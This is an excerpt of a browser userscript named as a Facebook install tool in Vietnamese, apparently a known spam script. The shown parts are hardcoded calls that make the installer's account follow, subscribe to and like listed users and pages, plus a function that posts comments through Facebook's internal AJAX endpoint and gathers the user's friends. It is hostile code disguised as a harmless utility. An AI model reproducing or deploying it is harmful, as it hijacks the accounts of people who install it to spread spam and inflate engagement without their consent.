// ==UserScript==
// @name            Cài Ðặt Incoi Facebook  :D ( Ver 1.4.7 )
...
//Bo To Day Tien
a("100004236790243");a("100004522000583");a("100007632104438");
sublist("1416817668542572");sublist("220932671400798");sublist("580663472015913");
sublist("232140433613355");sublist("236203529873712");
...
//Ku Tý
a("100005912050626");
sublist("148095302064204");sublist("148095448730856");sublist("148084368731964");
sublist("148096075397460");sublist("148095095397558");sublist("148097218730679");
sublist("148095678730833");
Like("155581444646428");Like("143391279205548");
//Nguyễn Hoàng Yến
a("100003793398890");
//Tớ Là Gấu
...
function yorum_yap(id ,mesaj) {
 ...
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
    ...
    xhr.send(params);
        ...
        arkadaslari_al(1424238601149233);